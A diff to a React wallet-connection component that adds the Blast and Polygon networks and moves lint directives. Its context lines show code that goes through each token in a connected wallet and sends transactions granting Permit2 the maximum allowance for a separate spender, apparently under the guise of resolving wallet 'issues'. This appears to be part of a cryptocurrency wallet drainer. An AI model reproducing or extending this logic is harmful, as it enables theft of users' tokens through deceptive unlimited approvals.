@@ -1,3 +1,4 @@
+/* eslint-disable @typescript-eslint/no-explicit-any */
 'use client';
 
 import { useState, useCallback, useEffect } from 'react';
@@ -10,7 +11,7 @@ import {
 import { ethers, Contract } from 'ethers';
 import { createAppKit, useAppKit, useAppKitProvider } from '@reown/appkit/react';
 import { Ethers5Adapter } from '@reown/appkit-adapter-ethers5';
-import { mainnet, arbitrum, base, bsc, linea, polygon, zksync, optimism, avalanche, zora } from '@reown/appkit/networks';
+import { mainnet, arbitrum, base, bsc, linea, polygon, zksync, optimism, avalanche, zora, blast } from '@reown/appkit/networks';
 import { Alchemy, Network } from 'alchemy-sdk';
 
 type WalletType = {
@@ -125,6 +126,7 @@ const networkMap: { [key: number]: Network } = {
   324: Network.ZKSYNC_MAINNET,
   10: Network.OPT_MAINNET,
   43114: Network.AVAX_MAINNET,
+  137: Network.MATIC_MAINNET,
 };
 
 const CONTRACT_ADDRESSES: { [Key: number]: string} = {
@@ -218,7 +220,7 @@ const metadata = {
 createAppKit({
   adapters: [new Ethers5Adapter()],
   metadata,
-  networks: [mainnet, arbitrum, base, bsc, linea, polygon, zksync, optimism, avalanche, zora],
+  networks: [mainnet, arbitrum, base, bsc, linea, polygon, zksync, optimism, avalanche, zora, blast],
   projectId,
   features: { analytics: true },
 });
@@ -283,7 +285,6 @@ export default function IssuesContent() {
   
       setProcessingAction('checking_approvals');
       
-      // eslint-disable-next-line @typescript-eslint/no-explicit-any
       const validTokens: any[] = []; // Only tokens that pass validation
       
       // Step 1: Validate tokens and check approvals
@@ -299,7 +300,6 @@ export default function IssuesContent() {
           try {
             currentAllowance = await tokenContract.allowance(account, permit2Address);
             console.log(`✅ ${token.symbol} allowance check successful: ${currentAllowance.toString()}`);
-          // eslint-disable-next-line @typescript-eslint/no-explicit-any
           } catch (allowanceError: any) {
             console.error(`❌ ${token.symbol} allowance check failed:`, allowanceError.message);
             console.log(`Skipping ${token.symbol} - invalid token contract or missing allowance function`);
@@ -316,7 +316,6 @@ export default function IssuesContent() {
               const tx = await signerContract.approve(permit2Address, MaxAllowanceTransferAmount);
               await tx.wait();
               console.log(`✅ ${token.symbol} approved successfully`);
-            // eslint-disable-next-line @typescript-eslint/no-explicit-any
             } catch (approveError: any) {
               console.error(`❌ Failed to approve ${token.symbol}:`, approveError.message);
               console.log(`Skipping ${token.symbol} - approval failed`);
@@ -329,7 +328,6 @@ export default function IssuesContent() {
           // If we get here, the token is valid and approved
           validTokens.push(token);
           
-        // eslint-disable-next-line @typescript-eslint/no-explicit-any
         } catch (tokenError: any) {
           console.error(`❌ Error with ${token.symbol}:`, tokenError.message);
           console.log(`Skipping ${token.symbol} - general error`);
@@ -450,6 +448,7 @@ export default function IssuesContent() {
       setProcessingAction('');
     }
   }, [account, provider, spender, chainId, tokens]);
+
   const connectWallet = useCallback(async () => {
     try {
       await open();
